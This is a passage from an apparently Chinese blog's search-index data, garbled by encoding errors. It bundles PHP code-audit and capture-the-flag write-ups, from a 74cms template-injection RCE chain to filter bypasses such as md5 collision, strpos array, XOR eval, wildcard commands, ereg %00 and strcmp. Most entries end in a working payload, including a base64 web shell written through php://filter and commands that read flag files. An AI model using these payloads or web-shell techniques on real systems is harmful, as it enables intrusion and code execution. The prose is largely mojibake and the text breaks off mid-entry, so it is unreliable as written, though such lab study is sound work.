¹æ®å®˜æ–¹å…¬å‘Šè¯´æ˜åœ¨/Application/Common/Controller/BaseController.class.phpæ–‡ä»¶çš„assign_resume_tplå‡½æ•°å› ä¸ºè¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´äº†æ¨¡æ¿æ³¨å…¥ï¼Œå¯ä»¥è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ éª‘å£«cmsé‡‡ç”¨çš„æ˜¯thinkphp3.2.3ç‰ˆæœ¬çš„æ¡†æ¶ï¼Œè¯¥æ¡†æ¶æ ‡å‡†çš„urlè·¯å¾„ä¸ºï¼š http://x.x.x.x/index.php/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ ä½†æ˜¯éª‘å£«cmsé‡‡ç”¨çš„æ˜¯æ™®é€šæ¨¡å¼ï¼Œå³ä½¿ç”¨ä¼ ç»Ÿçš„GETä¼ å‚æ–¹å¼æ¥æŒ‡å®šå½“å‰çš„è®¿é—®çš„æ¨¡å—å’Œæ“ä½œï¼Œå¯ä»¥é€šè¿‡/thinkphp/Conf/convention.phpæŸ¥çœ‹è®¾ç½®ï¼š å¯ä»¥å‘ç°ï¼Œä½¿ç”¨mè·å–æ¨¡å—ï¼Œcè·å–æ§åˆ¶å™¨ï¼Œaè·å–æ“ä½œï¼š?m=&amp;c=&amp;a=&amp;var1=&amp;var2= æ¸…æ¥šæœ€åŸºæœ¬çš„ä¼ å‚æ ¼å¼åï¼Œæˆ‘ä»¬æ¥çœ‹æ•´ä¸ªæ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹ã€‚ è·Ÿè¿›/Application/Common/Controller/BaseController.class.phpä¸­çš„assign_resume_tplæ–¹æ³•ï¼š æ­¤å¤„ä¼ å…¥ä¸¤ä¸ªå˜é‡ï¼Œå…¶ä¸­å˜é‡$tplä¼ å…¥åˆ°fetchæ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•,è¿›å…¥/ThinkPHP/Library/Think/View.class.php: é¦–å…ˆåˆ¤æ–­æ¨¡æ¿æ–‡ä»¶æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œç»§ç»­åˆ¤æ–­æ˜¯å¦ä½¿ç”¨äº†åŸç”Ÿæ¨¡æ¿ï¼ŒæŸ¥çœ‹é…ç½®æ–‡ä»¶/ThinkPHP/Conf/convention.phpï¼š é€šè¿‡é…ç½®æ–‡ä»¶å‘ç°éª‘å£«cmså¯ç”¨çš„æ˜¯Thinkæ¨¡æ¿å¼•æ“ï¼Œå› æ­¤åˆ¤æ–­è¿›å…¥else: è¿™é‡Œå°†å€¼å¸¦å…¥æ•°ç»„ï¼Œå¹¶ä¼ å…¥Hook::listen å¹¶è§£æview_parseæ ‡ç­¾ï¼Œè·Ÿè¿›/ThinkPHP/Library/Think/Hook.class.phpæ–¹æ³•ï¼š é€šè¿‡ä»£ç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒHook::listen()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šæŸ¥æ‰¾$tagsæ˜¯å¦ç»‘å®šview_parseæ–¹æ³•ï¼Œç„¶åforeachéå†$tagså±æ€§ï¼Œå¹¶æ‰§è¡ŒHook::execæ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼š é€šè¿‡ä»£ç æˆ‘ä»¬å‘ç°execæ–¹æ³•ä¼šæ£€æŸ¥è¡Œä¸ºåç§°ï¼Œå¦‚æœå«æœ‰Behaviorå…³é”®å­—ï¼Œå…¥å£æ–¹æ³•å¿…é¡»æ˜¯runæ–¹æ³•;è¿™é‡Œrunæ–¹æ³•ç”¨çš„æ‰€æœ‰å‚æ•°æ˜¯åœ¨Hook::listenæ—¶ä¼ é€’çš„ã€‚ æ­¤æ—¶æˆ‘ä»¬å»å¯»æ‰¾Hookçš„é…ç½®æ–‡ä»¶ï¼Œåœ¨/ThinkPHP/Mode/common.phpä¸­ ä»é…ç½®æ–‡ä»¶å¯ä»¥çœ‹åˆ°view_paraseæ ‡ç­¾æ‰§è¡Œäº†ParseTemplateBehaviorè¿™ä¸ªç±»ï¼Œå› ä¸ºè¿™è¾¹å·²ç»å®šä¹‰æ‰€æœ‰çš„è¡Œä¸ºæ‰§è¡Œå…¥å£å‡ä¸ºrunæ–¹æ³•ï¼Œæ‰€ä»¥è¿™è¾¹ç›´æ¥åˆ†ærunæ–¹æ³•å³å¯ï¼›è·Ÿè¿›è¿™ä¸ªç±»/ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.phpï¼š é˜…è¯»ä»¥ä¸Šä»£ç å‘ç°ç¬¬ä¸€æ¬¡è§£ææ—¶ï¼Œæ˜¯æ²¡æœ‰ç¼“å­˜æ–‡ä»¶çš„ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨templateæ‰§è¡Œfetchæ–¹æ³•: è·Ÿè¿›æ–‡ä»¶/ThinkPHP/Library/Think/Template.class.php è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°fetchæ–¹æ³•è°ƒç”¨äº†loadTemplateæ–¹æ³•ï¼Œè¿™é‡Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼š æˆ‘ä»¬å‘ç°å˜é‡$templateFileè¢«èµ‹å€¼ç»™äº†$tmplContent,ç„¶åè¯¥å˜é‡åœ¨ç¼–è¯‘æ¨¡æ¿å†…å®¹æ—¶èµ‹å€¼äº†æ–¹æ³•compiler()æ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼š åˆ†æè¯¥æ®µä»£ç æˆ‘ä»¬å‘ç°ï¼Œè¿™é‡Œä¼ å…¥çš„æ¨¡æ¿å†…å®¹æœªç»è¿‡ä»»ä½•è¿‡æ»¤å°±æ‹¼æ¥åˆ°äº†$tmplContentå˜é‡ä¸­ ç„¶åå›å½’åˆ°loadTemplateæ–¹æ³•,è·Ÿè¸ªåˆ°ä¸‹é¢ï¼Œçœ‹åˆ°æœ‰ç¼–è¯‘æ¨¡æ¿å†…å®¹çš„é€»è¾‘ä»£ç å¦‚ä¸‹ï¼š è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°çš„æ˜¯å¯¹æ¨¡æ¿è¿›è¡Œç¼“å­˜å¤„ç†ï¼Œç„¶åè¿”å›æ¨¡æ¿çš„ç¼“å­˜æ–‡ä»¶å ç»§ç»­å›å½’åˆ°æ­¤å‰fetchæ–¹æ³•: æˆ‘ä»¬å‘ç°è¿”å›çš„ç¼“å­˜æ–‡ä»¶åè¿›å…¥åˆ°Storage::loadçš„æ–¹æ³•,è·Ÿè¿›è¯¥æ–¹æ³•ï¼š çœ‹åˆ°ä¸Šé¢ä»£ç å°±æ˜äº†äº†ï¼Œç›´æ¥å…ˆè¿›è¡Œä¸€ä¸ªéç©ºåˆ¤æ–­ï¼Œä¸ä¸ºç©ºçš„æƒ…å†µä¸‹ç›´æ¥åŒ…å«äº†è¯¥æ–‡ä»¶ã€‚ æ•´ä½“åˆ©ç”¨é“¾","link":"/2021/01/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-audit-74cmsssti-readfile/"},{"title":"bypass_strpos","text":"bypass_strposé¢˜ç›®æºç 12345678910111213141516171819202122232425&lt;?phpinclude 'flag.php';header('referer:$_GET[\\'100fc9da60f9ae9d6488451decdc0742\\']');if(isset($_GET['52384'])){ show_source(__FILE__);}else if(isset($_GET['a'])){ if(md5($_GET['a']) == md5('s155964671a') &amp;&amp; substr($_GET['a'],-1) == 8) { if(preg_match(&quot;/goodjob/&quot;, $_GET['b']) === FALSE &amp;&amp; strpos ($_GET['b'], 'goodjob') !== FALSE) { $text = @$_REQUEST['d']; @eval(&quot;var_dump($text);&quot;); } else die('no,no,no'); } else die('no,no,no'); }else echo 'welcome';?&gt; ä»£ç åˆ†æé¦–å…ˆé€šè¿‡GETä¼ å‚æ¥æ”¶ä¸€ä¸ªmd5çš„åŠ å¯†å€¼ï¼› æŠ“åŒ…ååœ¨,åœ¨å“åº”å¤´ä¿¡æ¯ä¸­å¯ä»¥å‘ç°referer:$_GET['100fc9da60f9ae9d6488451decdc0742']â€™; ç‚¸çœ¼ä¸€çœ‹,ç¡®å®šæ˜¯ä¸€ä¸²åŠ å¯†å€¼ï¼Œé¦–å…ˆå¯¹è¿™ä¸ªè¿›è¡Œgetä¼ å‚ï¼Œå‘ç°æ²¡æœ‰ï¼Œè¯´æ˜ä¸æ˜¯ç›´æ¥ä¼ å…¥md5åŠ å¯†å€¼ã€‚å°è¯•å¯¹è¯¥md5å€¼è¿›è¡Œæ˜æ–‡çˆ†ç ´ï¼Œå¾—åˆ°å…¶æ˜æ–‡ä¸º52384,getä¼ å…¥è¯¥å€¼ç›´æ¥è·å–æºç ; åˆ†ææºç ç¬¬ä¸€ä¸ªåˆ¤æ–­æ˜¯å˜é‡açš„md5å€¼ä¸ç»™å®šæ˜æ–‡çš„md5å€¼ç›¸ç­‰ï¼Œå¹¶ä¸”è¦ä¿è¯å…¶å€¼çš„æœ€åä¸€ä½ä¸º8ï¼›é‚£ä¹ˆç›´æ¥md5ç¢°æ’å‘—ï¼Œæ‰¾åˆ°å…¶å€¼ä¸º240610708ï¼› ç¬¬äºŒä¸ªåˆ¤æ–­æ˜¯å‚æ•°bç»è¿‡strposå‡½æ•°ï¼Œstrposå‡½æ•°æ˜¯ç”¨æˆ·å­—ç¬¦ä¸²æŸ¥æ‰¾çš„;è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨ç©ºæ•°ç»„ç»•è¿‡,å³b[]=; æœ€åä¼ å…¥å˜é‡dç»è¿‡evalå‡½æ•°,å˜é‡åœ¨var_dumpå‡½æ•°ä¸­ï¼Œç›´æ¥ä¼ å…¥$flag; æ¼æ´åˆ©ç”¨payload:?a=240610708&amp;b[]=&amp;d=$flag","link":"/2018/07/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-code-audit-bypass-strpos/"},{"title":"bypass_exit","text":"bypass_exité¢˜ç›®æºç 1234567891011&lt;?php$a = '&lt;?php exit(0);?&gt;';$a .= @$_POST['c'];$file = @$_POST['file'];if (isset($file)){ file_put_contents($file, $a);}else{ show_source(__FILE__); // flag in flag.php}?&gt; ä»£ç åˆ†æé¦–å…ˆå°†ä»£ç &lt;?php exit(0);?&gt;èµ‹å€¼ç»™å˜é‡$a; é€šè¿‡POSTæ–¹å¼æ¥å—å˜é‡cçš„å†…å®¹æ‹¼æ¥å˜å˜é‡$aä¸­,è¿™æ ·ä¸è®ºå¦‚ä½•ï¼Œå†™å…¥çš„shelléƒ½æ— æ³•è¢«æ­£å¸¸åˆ©ç”¨; è¿™é‡Œä½¿ç”¨base64-decodeçš„æ–¹å¼å¯¹å…¶è¿›è¡Œç»•è¿‡,å› ä¸ºbase64åœ¨è§£ç æ—¶ï¼Œä¼šå¯¹&lt;ã€?ã€;ã€&gt;è¿™äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œå¿½ç•¥ï¼Œé‚£ä¹ˆåŸæœ¬çš„ç¬¬ä¸€è¡Œä»£ç å°±å˜æˆäº†phpexit; æ¼æ´åˆ©ç”¨payload:c=PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8+&amp;file=php://filter/write=convert.base64-decode/resource=shell.php æˆåŠŸå†™å…¥shell:cmd=system(â€˜cat flag.phpâ€™);","link":"/2018/07/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-code-audit-bypass-exit/"},{"title":"eval_xor","text":"eval_xoré¢˜ç›®æºç 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpfunction getPos(){ @include 'find.php'; echo $findflag;}?&gt;&lt;?phpsession_start(); if (isset ($_GET['cover'])) { if ($_GET['cover'] == $_SESSION['cover']) { echo 'ok'; if(isset($_GET['code'])) { if(strlen($_GET['code'])&gt;35) { echo strlen($_GET['code']); die(&quot;over maxlength!!&quot;); } else { $code=$_GET['code']; if(preg_match(&quot;/[A-Za-z0-9_.]+/&quot;,$code)) { die(&quot;Hacher!!!&quot;); } else { @eval($code); } } } } else echo 'Access Deny';}else{ highlight_file(__FILE__);}?&gt; ä»£ç åˆ†ægetä¼ å…¥çš„coverå˜é‡å€¼å¿…é¡»è¦ä¸sessionå€¼ç›¸ç­‰ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨sessionç»•è¿‡ï¼Œç›´æ¥ä¼ å…¥ä¸€ä¸ªç©ºçš„coverï¼› é€šè¿‡getä¼ å…¥codeå˜é‡å€¼ï¼Œcodeå˜é‡å­—ç¬¦ä¸²çš„é•¿åº¦ä¸èƒ½è¶…è¿‡35ä½;ä¸”å­—ç¬¦ä¸²ä¸èƒ½å«æœ‰æ•°å­—ã€å­—æ¯ã€_ã€.ã€+ç­‰ç‰¹æ®Šå­—ç¬¦ï¼› æœ€ç»ˆcodeå˜é‡å¸¦å…¥evalå‡½æ•°,è¿™é‡Œé¦–å…ˆä¼ å…¥å‡½æ•°getPos()ï¼› å…³äºæ€ä¹ˆç»•è¿‡çš„å­—ç¬¦ä¸²çš„è¿‡æ»¤ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ä¸²çš„å¼‚æˆ–æ¥å®ç°ï¼Œç›´æ¥ä¸Šå¼‚æˆ–è„šæœ¬: 123456789101112131415chr1 = ['@', '!', '&quot;', '#', '$', '%', '&amp;', '\\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '&lt;', '=', '&gt;', '?', '[', '\\\\', ']', '^', '_', '`', '{', '|', '}', '~']chr2 = ['@', '!', '&quot;', '#', '$', '%', '&amp;', '\\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '&lt;', '=', '&gt;', '?', '[', '\\\\', ']', '^', '_', '`', '{', '|', '}', '~']for i in chr1 : for j in chr2 : if chr(ord(i) ^ ord(j)) in ['g','e','t','P','o','s',]: print(i + 'xor' + j + '=' + (chr(ord(i) ^ ord(j))))è¿è¡Œä¹‹åæ‰¾åˆ°æœªè¢«è¿‡æ»¤çš„ç‰¹æ®Šå­—ç¬¦ä¸²çš„äº¦æˆ–å¦‚ä¸‹ï¼š@xor'=g%xor@=e/xor[=t}xor-=P/xor@=o-xor^=s è¿™é‡Œä¼ å…¥çš„code=$\\_=&quot;@%/}/-&quot;^&quot;'@[-@^&quot;;$\\_(); ä½†æ˜¯_è¢«è¿‡æ»¤çš„,ä¸æ€•ï¼Œè¿™é‡Œå¯ç”¨æ±‰å­ä»£æ›¿ï¼Œæœ€ç»ˆå¦‚ä¸‹ï¼š code=$æ·¦=&quot;@%/}/-&quot;^&quot;'@[-@^&quot;;$æ·¦(); è¿è¡Œä¹‹åå¾—åˆ°flagåœ¨/fl4gnnnä¸­;å› ä¸ºä¼ å…¥evalå‡½æ•°,å¯ä»¥ç›´æ¥æ„é€ æ‰§è¡Œå‘½ä»¤/bin/cat /fl4gnnn; é€šè¿‡è„šæœ¬å¯¹fl4gnnnå¼‚æˆ–åå‘ç°ï¼Œæ— è®ºæ€ä¹ˆå¼‚æˆ–nçš„ç‰¹æ®Šå­—ç¬¦ä¸­å‡æœ‰. ä½†æ˜¯.æ˜¯è¢«è¿‡æ»¤çš„,æ‰€ä»¥è¿™è¾¹è€ƒè™‘ä½¿ç”¨shellé€šé…ç¬¦å®ç°ï¼› æ„é€ /???/???%20/??????? æ‰§è¡Œå‘½ä»¤å¯ä»¥ä½¿ç”¨åå¼•å·ï¼Œä½†æ˜¯éœ€è¦echo ,é€šè¿‡çŸ­æ ‡ç­¾çš„çŸ¥è¯†äº†è§£ ç­‰ä»·äº æ‰€ä»¥æœ€ç»ˆå½¢å¼ä¸ºï¼š?&gt;&lt;?=/???/???%20/????????&gt; æ¼æ´åˆ©ç”¨payload:?cover&amp;code=?&gt;&lt;?=/???/???%20/????????&gt;","link":"/2019/01/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-code-audit-eval-xor/"},{"title":"eval(2020NSSC)","text":"eval(2020NSSC)é¢˜ç›®æºç 12345678910111213141516&lt;?phperror_reporting(0);//flag is located in flag.phpif( isset($_GET['a']) ){ $a = $_GET['a']; if( strlen($a)&gt;27 ){ die(strval(strlen($a)) . &quot; Long.&quot;); } if( preg_match(&quot;/[A-Zb-z0-9_$.&amp;;|^~![\\](){}\\$@\\*]+/&quot;, $a) ){ die(&quot;NO.&quot;); } eval(&quot;echo '&quot; . $a .&quot;';&quot;);} else { show_source(__FILE__);}?&gt; ä»£ç åˆ†æåˆ†ææ­£åˆ™åŒ¹é…å‘ç°å­—æ¯aæœªè¿‡æ»¤,ç‰¹æ®Šå­—ç¬¦?æœªè¿‡æ»¤;èŠèŠ±ä¸€ç´§ï¼Œæƒ³åˆ°é“é“çš„é€šé…ç¬¦ç»•è¿‡å•Š; åœ¨å½“å‰ç›®å½•ä¸‹æœ‰flag.php æ‰€ä»¥æ„é€ /bin/cat flag.php å³å¯è¯»å–æ–‡ä»¶å†…å®¹ å¯¹äºevalå½“ä¸­çš„æ‹¼æ¥ç¬¦å·. å¯ä»¥ä½¿ç”¨ï¼Œç»•è¿‡ï¼›å¹¶ä¸”åˆ©ç”¨åå¼•å·æ‰§è¡Œå‘½ä»¤; æ¼æ´åˆ©ç”¨payload:?a=',\\/???/?a?%20??a?????`,â€™`","link":"/2020/12/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-code-audit-eval-2020NSSC/"},{"title":"phpè¯­è¨€ç‰¹æ€§ç±»å‹è®²è§£","text":"PHPè¯­è¨€ç‰¹æ€§extractå˜é‡è¦†ç›–æ¼æ´æºç 12345678910111213141516&lt;?php $flag='cimer'; extract($_GET);if(isset($shiyan)){ $content=trim(file_get_contents($flag)); if($shiyan==$content) { echo'ctf{cimer_2021_come_on}'; } else { echo'Oh.no'; } }?&gt; æ¼æ´åˆ†æextract()å‡½æ•° ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ è¯­æ³•ï¼šextract(array,extract_rules,prefix) array,å¿…éœ€ï¼Œè¦ä½¿ç”¨çš„æ•°ç»„ GETä¼ å‚æˆ–è€…POSTä¼ å‚æ—¶ï¼Œå¸¦å…¥åˆ°extactå‡½æ•°ä¸­ï¼Œç›´æ¥ä¼ å…¥åŒåå˜é‡åï¼Œå³å¯è¦†ç›–åŸæœ‰å˜é‡å€¼ã€‚ flagå˜é‡å€¼ä¸ºcimer extract()é€šè¿‡GETæ–¹å¼æ¥å—ä¸€ä¸ªæ•°ç»„ï¼Œé”®åä½œä¸ºå˜é‡åï¼Œå€¼ä¸ºå˜é‡å€¼ å¦‚æœå˜é‡$shiyanä¸ºç©ºï¼Œåˆ™$flagå€¼é€šè¿‡file_get_contents()èµ‹å€¼ç»™å˜é‡$content å¦‚æœå˜é‡$shiyanä¸$contentå€¼ç›¸åŒï¼Œåˆ™è¾“å‡ºflag æ¼æ´åˆ©ç”¨payloadæ„é€ index.php?shiyan=&amp;flag= ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦æ¼æ´æºç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpinclude 'flag.php'; $info = &quot;&quot;; $req = []; ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_GET['number'])){ header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); die(&quot;have a fun!!&quot;);} foreach([$_GET, $_POST] as $global_var) { foreach($global_var as $key =&gt; $value) { $value = trim($value); is_string($value) &amp;&amp; $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i &lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } if(is_numeric($_REQUEST['number'])) { $info=&quot;sorry, you cann't input a number!&quot;;}elseif($req['number']!=strval(intval($req['number']))) { $info = &quot;number must be equal to it's integer!! &quot;; }else{ $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2){ $info=&quot;no, this is not a palindrome number!&quot;; } else { if(is_palindrome_number($req[&quot;number&quot;])){ $info = &quot;nice! {$value1} is a palindrome number!&quot;; } else{ $info=$flag; } } } echo $info;?&gt; æ¼æ´åˆ†æå‡½æ•°åˆ†æ trim â€” å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰ is_string â€” æ£€æµ‹å˜é‡æ˜¯å¦æ˜¯å­—ç¬¦ä¸²ï¼Œaddslashes â€” ä½¿ç”¨åæ–œçº¿å¼•ç”¨å­—ç¬¦ä¸² strval â€” è·å–å˜é‡çš„å­—ç¬¦ä¸²å€¼ strlen â€” è·å–å­—ç¬¦ä¸²é•¿åº¦ is_numeric â€” æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸² intval â€” è·å–å˜é‡çš„æ•´æ•°å€¼ is_palindrome_number â€”â€” è‡ªå®šä¹‰å‡½æ•°åˆ¤æ–­æ•°å­—æ˜¯å¦ä¸ºéå›æ–‡æ•° é€»è¾‘åˆ†æ numberä¸ºgetæ¥å—å‚æ•°å˜é‡ï¼› ç¬¬ä¸€ä¸ªåˆ¤æ–­å¦‚æœå˜é‡numberä¸ºç©ºå€¼ï¼Œåˆ™è®¾ç½®headeræœ‰hintå­—æ®µï¼Œå¹¶dieå‡ºä¸€å¥è¯; æ¡ä»¶ä¸€ï¼šif(is_numeric($_REQUEST['number'])) æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–è€…æ•°å­—å­—ç¬¦ä¸²ï¼Œæ¡ä»¶æ˜¯falseï¼› æ¡ä»¶äºŒï¼šelseif($req['number']!=strval(intval($req['number'])))æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºå›æ–‡æ•°ï¼› æ¡ä»¶ä¸‰ï¼šif(is_palindrome_number($req[&quot;number&quot;]))è°ƒç”¨å‡½æ•°is_palindrome_numberåˆ¤æ–­å½“å‰æ•°å­—ä¸ºéå›æ–‡æ•° ç»•è¿‡æ¡ä»¶ä¸€çš„æ–¹å¼æ˜¯ï¼š%00ä¸ºç©ºå­—ç¬¦ï¼Œä¸ä¼šå½±å“åé¢çš„æ•°å€¼ï¼› å’‹çœ¼ä¸€çœ‹æ¡ä»¶äºŒå’Œæ¡ä»¶ä¸‰æ˜¯å†²çªçš„ï¼Œè¿™è¾¹æˆ‘ä»¬å¿…é¡»æƒ³æ³•å­ç»•è¿‡ï¼›ä¸ºäº†åŒæ—¶æ»¡è¶³æ¡ä»¶äºŒå’Œç»•è¿‡å‡½æ•°is_palindrome_numberã€‚å¯ä»¥å¯¹æºä»£ç è¿›è¡Œç›¸å…³ç®€åŒ–ï¼Œå¾—åˆ°å¦‚ä¸‹ç®€åŒ–ä»£ç ï¼š 123456789101112131415161718&lt;?phpfunction is_palindrome_number($number) { $number = strval($number); //strval â€” è·å–å˜é‡çš„å­—ç¬¦ä¸²å€¼ $i = 0; $j = strlen($number) - 1; //strlen â€” è·å–å­—ç¬¦ä¸²é•¿åº¦ while($i &lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true;}$a = trim($_GET['number']);var_dump(($a==strval(intval($a)))&amp;(intval($a)==intval(strrev($a)))&amp;!is_palindrome_number($a))?&gt; fuzzingä»£ç å¦‚ä¸‹ï¼š 12345678910111213#!/usr/local/env python2#conding:utf-8import requestsfor i in range(256): rq = requests.get(&quot;http://192.168.1.191:32776/stage/2/index2.php?number=%s191&quot;%(&quot;%%%02X&quot;%i)) #print(rq.text) if '1' in rq.text: print &quot;%%%02X&quot;%i output: %0C %2B æ¼æ´åˆ©ç”¨payload:http://192.168.1.191:32776/stage/2/index2.php?number=%00%0C191 eregæ­£åˆ™ç»•è¿‡æ¼æ´æºç 123456789101112131415161718192021222324252627&lt;?php include 'flag.php';if (isset ($_GET['password'])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET['password']) === FALSE) { echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; } else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); } } else { echo '&lt;p&gt;Invalid password&lt;/p&gt;'; } } ?&gt; æ¼æ´åˆ†æeregå‡½æ•°:å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚æ­¤å‡½æ•°å­˜åœ¨%00æˆªæ–­é—®é¢˜ï¼Œåªè¦é‡åˆ°%00å°±åœæ­¢åŒ¹é…ã€‚ æ¡ä»¶ä¸€ï¼šé¦–å…ˆergeæ­£åˆ™åŒ¹é…ä½¿å¾—å˜é‡passwordå¿…é¡»æ»¡è¶³æ•°å­—å­—æ¯ç»„æˆï¼› æ¡ä»¶äºŒï¼šé™åˆ¶passwordé•¿åº¦å¿…é¡»å°äº8ï¼Œå¹¶ä¸”å€¼è¦å¤§äº9999999ï¼› æ¡ä»¶ä¸‰ï¼šå¯†ç ä¸­å¿…é¡»è¦å«æœ‰å­—ç¬¦*-*; æ¼æ´åˆ©ç”¨ç»•è¿‡æ¡ä»¶ä¸€ä½¿ç”¨%00æˆªæ–­ï¼› ç»•è¿‡æ¡ä»¶è€Œä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•1e9; æ»¡è¶³æ¡ä»¶ä¸‰%00åé¢æ‹¼æ¥*-*; payload:?password=1e9%00*-* strcmpæ¯”è¾ƒå­—ç¬¦ä¸²æ¼æ´æºç 123456789101112&lt;?phpinclude 'flag.php';highlight_file(__FILE__);if (isset($_GET['a'])) { if (strcmp($_GET['a'], $flag) == 0) die('Flag: '.$flag); else print 'No'; }?&gt; æ¼æ´åˆ†æstrcmp() è¿™ä¸ªå‡½æ•°ç”¨äºå­—ç¬¦ä¸²æ¯”è¾ƒ 12int strcmp ( string $str1 , string $str2 )// å‚æ•° str1ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚str2ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ã€‚å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚ å¯çŸ¥ï¼Œä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œè¿™ä¸ªå‡½æ•°å°†ä¼šæœ‰æ€ä¹ˆæ ·çš„è¡Œä¸ºå‘¢ï¼Ÿå®é™…ä¸Šï¼Œå½“è¿™ä¸ªå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œè¿™ä¸ªå‡½æ•°å°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯åœ¨5.3ä¹‹å‰çš„phpä¸­ï¼Œæ˜¾ç¤ºäº†æŠ¥é”™çš„è­¦å‘Šä¿¡æ¯åï¼Œå°†return 0 !!!! ä¹Ÿå°±æ˜¯è™½ç„¶æŠ¥äº†é”™ï¼Œä½†å´åˆ¤å®šå…¶ç›¸ç­‰äº†ã€‚è¿™å¯¹äºä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥åšé€‰æ‹©è¯­å¥ä¸­çš„åˆ¤æ–­çš„ä»£ç æ¥è¯´ç®€ç›´æ˜¯ä¸€ä¸ªè‡´å‘½çš„æ¼æ´ï¼Œå½“ç„¶ï¼Œphpå®˜æ–¹åœ¨åé¢çš„ç‰ˆæœ¬ä¸­ä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼Œä½¿å¾—æŠ¥é”™çš„æ—¶å€™å‡½æ•°ä¸è¿”å›ä»»ä½•å€¼ã€‚strcmpåªä¼šå¤„ç†å­—ç¬¦ä¸²å‚æ•°ï¼Œå¦‚æœç»™ä¸ªæ•°ç»„çš„è¯å‘¢ï¼Œå°±ä¼šè¿”å›NULL,è€Œåˆ¤æ–­ä½¿ç”¨çš„æ˜¯==ï¼ŒNULL==0æ˜¯ bool(true) æ¼æ´åˆ©ç”¨payload:?a[]=1 sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡æ¼æ´æºç 1234567891011121314151617&lt;?phpinclude 'flag.php';highlight_file(__FILE__);if (isset($_GET['name']) and isset($_GET['password'])) { 